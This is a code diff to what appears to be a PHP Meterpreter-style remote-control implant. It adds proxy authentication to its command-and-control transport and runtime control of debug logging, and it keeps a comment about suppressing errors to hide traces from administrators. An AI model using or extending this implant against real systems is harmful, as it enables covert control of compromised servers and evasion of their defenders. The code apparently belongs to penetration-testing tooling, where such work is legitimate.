@@ -46,10 +46,22 @@ function register_command($c, $i) {
 define("MY_DEBUGGING", false);
 define("MY_DEBUGGING_LOG_FILE_PATH", false);
 
+function my_debugging_enabled() {
+  return (isset($GLOBALS['DEBUGGING']) ? $GLOBALS['DEBUGGING'] : MY_DEBUGGING) ? true : false;
+}
+
+function my_debugging_path() {
+  if (isset($GLOBALS['DEBUGGING_LOG_FILE_PATH']) && $GLOBALS['DEBUGGING_LOG_FILE_PATH']) {
+    return $GLOBALS['DEBUGGING_LOG_FILE_PATH'];
+  }
+  return MY_DEBUGGING_LOG_FILE_PATH;
+}
+
 function my_logfile($str) {
-  if (MY_DEBUGGING && MY_DEBUGGING_LOG_FILE_PATH) {
+  $path = my_debugging_path();
+  if (my_debugging_enabled() && $path) {
     if (!isset($GLOBALS['logfile'])) {
-      $GLOBALS['logfile'] = fopen(MY_DEBUGGING_LOG_FILE_PATH, 'a');
+      $GLOBALS['logfile'] = fopen($path, 'a');
 
       if (!$GLOBALS['logfile']) {
         my_print("Failed to open debug log file");
@@ -63,7 +75,7 @@ function my_logfile($str) {
 }
 
 function my_print($str) {
-  if (MY_DEBUGGING) {
+  if (my_debugging_enabled()) {
     error_log($str);
     my_logfile($str);
   }
@@ -1212,6 +1224,10 @@ function parse_config_block($raw) {
       $t['ua'] = ($tlv != null) ? $tlv['value'] : null;
       $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_PROXY_URL);
       $t['proxy_url'] = ($tlv != null) ? $tlv['value'] : null;
+      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_PROXY_USER);
+      $t['proxy_user'] = ($tlv != null) ? $tlv['value'] : null;
+      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_PROXY_PASS);
+      $t['proxy_pass'] = ($tlv != null) ? $tlv['value'] : null;
       $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_HEADERS);
       $t['custom_headers'] = ($tlv != null) ? $tlv['value'] : null;
 
@@ -1704,6 +1720,11 @@ function http_build_context($transport, $profile, $body = null) {
   if (isset($transport['proxy_url']) && $transport['proxy_url'] != null) {
     $opts['http']['proxy'] = $transport['proxy_url'];
     $opts['http']['request_fulluri'] = true;
+    if (!empty($transport['proxy_user'])) {
+      $pass = isset($transport['proxy_pass']) ? $transport['proxy_pass'] : '';
+      $auth = base64_encode($transport['proxy_user'] . ':' . $pass);
+      $opts['http']['header'] .= "Proxy-Authorization: Basic " . $auth . "\r\n";
+    }
   }
 
   if (strpos($transport['url'], 'https') === 0) {
@@ -1766,7 +1787,7 @@ ob_implicit_flush();
 
 # Turn off error reporting so we don't leave any ugly logs.  Why make an
 # administrator's job easier if we don't have to?  =)
-if (MY_DEBUGGING) {
+if (my_debugging_enabled()) {
   error_reporting(E_ALL);
 } else {
   error_reporting(0);
@@ -1786,8 +1807,10 @@ $GLOBALS['SESSION_GUID'] = $config['session_guid'];
 $GLOBALS['AES_KEY'] = $config['sym_key'];
 $GLOBALS['AES_ENABLED'] = false;
 
-if ($config['debug_log'] != null) {
-  # Debug logging path comes from config
+if ($config['debug_log'] != null && strlen($config['debug_log']) > 0) {
+  # TLV-supplied debug log path overrides the compile-time MY_DEBUGGING_LOG_FILE_PATH
+  $GLOBALS['DEBUGGING'] = true;
+  $GLOBALS['DEBUGGING_LOG_FILE_PATH'] = $config['debug_log'];
   my_print("Debug log path: " . $config['debug_log']);
 }
 
